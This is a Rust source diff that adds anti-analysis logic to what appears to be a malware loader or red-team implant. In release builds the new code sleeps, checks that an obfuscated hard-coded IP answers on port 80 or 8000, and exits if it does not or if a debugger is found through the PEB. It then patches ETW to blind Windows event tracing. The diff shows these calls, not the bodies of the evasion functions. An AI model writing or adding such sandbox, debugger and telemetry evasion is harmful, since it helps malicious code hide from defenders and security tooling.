@@ -8,6 +8,8 @@ mod hwbp;
 mod file;
 mod nt_api;
 mod debug_helper;
+mod evasion;
+mod reconnaissance;
 use crate::debug_helper::*;
 
 use obfuse::obfuse;
@@ -48,6 +50,34 @@ fn main() {
     //     eprintln!("[ERROR] --url must be provided.");
     //     std::process::exit(1);
     // };
+
+    #[cfg(not(debug_assertions))]
+    {
+        for _i in 1..=3 {
+            thread::sleep(Duration::from_secs(1));
+        }
+
+        let obfused_ip = obfuse!("192.168.48.1");
+        let ip = obfused_ip.as_str();
+        let common_ports = [80, 8000];
+        let online = common_ports.iter().any(|&port| {
+            reconnaissance::is_host_online(ip, port)
+        });
+        
+        if !online {
+            return;
+        }
+    }
+
+    #[cfg(not(debug_assertions))]
+    unsafe {
+
+        if evasion::being_debugged_by_peb() {
+            return;
+        } 
+        let _ = evasion::patch_etw().expect("[ERROR] Failed to patch E T W.");
+
+    }
 
     nt_api::init_nt_api().expect("[ERROR] Failed to initialize NT API!");
 
